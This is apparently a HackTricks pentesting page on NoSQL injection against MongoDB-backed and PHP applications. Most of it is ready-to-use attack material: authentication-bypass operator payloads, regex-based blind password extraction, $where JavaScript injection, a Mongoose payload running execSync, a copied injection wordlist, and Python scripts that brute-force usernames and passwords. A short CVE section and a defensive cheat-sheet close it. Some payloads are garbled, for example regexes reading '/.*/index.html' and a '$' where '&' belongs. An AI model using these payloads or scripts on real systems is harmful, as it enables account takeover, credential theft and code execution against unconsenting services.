# NoSQL injection

{{#include ../banners/hacktricks-training.md}}

## Exploit

In PHP you can send an Array changing the sent parameter from _parameter=foo_ to _parameter[arrName]=foo._

The exploits are based in adding an **Operator**:

```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

### Basic authentication bypass

**Using not equal ($ne) or greater ($gt)**

```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

### **SQL - Mongo**

```javascript
query = { $where: `this.username == '${username}'` }
```

An attacker can exploit this by inputting strings like `admin' || 'a'=='a`, making the query return all documents by satisfying the condition with a tautology (`'a'=='a'`). This is analogous to SQL injection attacks where inputs like `' or 1=1-- -` are used to manipulate SQL queries. In MongoDB, similar injections can be done using inputs like `' || 1==1//`, `' || 1==1%00`, or `admin' || 'a'=='a`.

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00     or    admin' || 'a'=='a
```

### Extract **length** information

```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```

### Extract **data** information

```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### **SQL - Mongo**

```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/index.html)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```

### PHP Arbitrary Function Execution

Using the **$func** operator of the [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) library (used by default) it might be possible to execute and arbitrary function as in [this report](https://swarm.ptsecurity.com/rce-cockpit-cms/).

```python
"user":{"$func": "var_dump"}
```

![https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_check_10.png](<../images/image (933).png>)

### Get info from different collection

It's possible to use [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a **different collection** called **`users`** and getting the **results of all the entries** with a password matching a wildcard.

**NOTE:** `$lookup` and other aggregation functions are only available if the `aggregate()` function was used to perform the search instead of the more common `find()` or `findOne()` functions.

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "resultado",
      "pipeline": [
        {
          "$match": {
            "password": {
              "$regex": "^.*"
            }
          }
        }
      ]
    }
  }
]
```

### Error-Based Injection

Inject `throw new Error(JSON.stringify(this))` in a `$where` clause to exfiltrate full documents via server-side JavaScript errors (requires application to leak database errors). Example:

```json
{ "$where": "this.username='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));" }
```

## Recent CVEs & Real-World Exploits (2023-2025)

### Rocket.Chat unauthenticated blind NoSQLi – CVE-2023-28359
Versions ≤ 6.0.0 exposed the Meteor method `listEmojiCustom` that forwarded a user-controlled **selector** object directly to `find()`. By injecting operators such as `{"$where":"sleep(2000)||true"}` an unauthenticated attacker could build a timing oracle and exfiltrate documents. The bug was patched in 6.0.1 by validating selector shape and stripping dangerous operators. 

### Mongoose `populate().match` `$where` RCE – CVE-2024-53900 & CVE-2025-23061
When `populate()` is used with the `match` option, Mongoose (≤ 8.8.2) copied the object verbatim *before* sending it to MongoDB. Supplying `$where` therefore executed JavaScript **inside Node.js** even if server-side JS was disabled on MongoDB:

```js
// GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')
Post.find()
    .populate({ path: 'author', match: req.query.author });   // RCE
```

The first patch (8.8.3) blocked top-level `$where`, but nesting it under `$or` bypassed the filter, leading to CVE-2025-23061. The issue was fully fixed in 8.9.5, and a new connection option `sanitizeFilter: true` was introduced.

### GraphQL → Mongo filter confusion
Resolvers that forward `args.filter` directly into `collection.find()` remain vulnerable:

```graphql
query users($f:UserFilter){
  users(filter:$f){ _id email }
}

# variables
{ "f": { "$ne": {} } }
```

Mitigations: recursively strip keys that start with `$`, map allowed operators explicitly, or validate with schema libraries (Joi, Zod).

## Defensive Cheat-Sheet (updated 2025)

1. Strip or reject any key that starts with `$` (`express-mongo-sanitize`, `mongo-sanitize`, Mongoose `sanitizeFilter:true`).
2. Disable server-side JavaScript on self-hosted MongoDB (`--noscripting`, default in v7.0+).
3. Prefer `$expr` and aggregation builders instead of `$where`.
4. Validate data types early (Joi/Ajv) and disallow arrays where scalars are expected to avoid `[$ne]` tricks.
5. For GraphQL, translate filter arguments through an allow-list; never spread untrusted objects.

## MongoDB Payloads

List [from here](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/index.html)//+%00
' && this.passwordzz.match(/.*/index.html)//+%00
'%20%26%26%20this.password.match(/.*/index.html)//+%00
'%20%26%26%20this.passwordzz.match(/.*/index.html)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

## Blind NoSQL Script

```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://chall.com?param=^"+flag+char)
        if ("<TRUE>" in r.text):
            flag += char
            print("[+] Flag: "+flag)
            break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

### Brute-force login usernames and passwords from POST login

This is a simple script that you could modify but the previous tools can also do this task.

```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]

def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames(prefix):
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*"}
    for c in possible_chars:
        username = "^" + prefix + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print(username)
            for user in get_usernames(prefix + c):
                usernames.append(user)
    return usernames

for u in get_usernames(""):
    get_password(u)
```

## Tools
- [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
- [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)
- [https://github.com/ImKKingshuk/StealthNoSQL](https://github.com/ImKKingshuk/StealthNoSQL)
- [https://github.com/Charlie-belmer/nosqli](https://github.com/Charlie-belmer/nosqli)

## References

- [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [https://nullsweep.com/a-nosql-injection-primer-with-mongo/](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
- [https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)
- [https://sensepost.com/blog/2025/nosql-error-based-injection/](https://sensepost.com/blog/2025/nosql-error-based-injection/)
- [https://nvd.nist.gov/vuln/detail/CVE-2023-28359](https://nvd.nist.gov/vuln/detail/CVE-2023-28359)
- [https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900)

{{#include ../banners/hacktricks-training.md}}
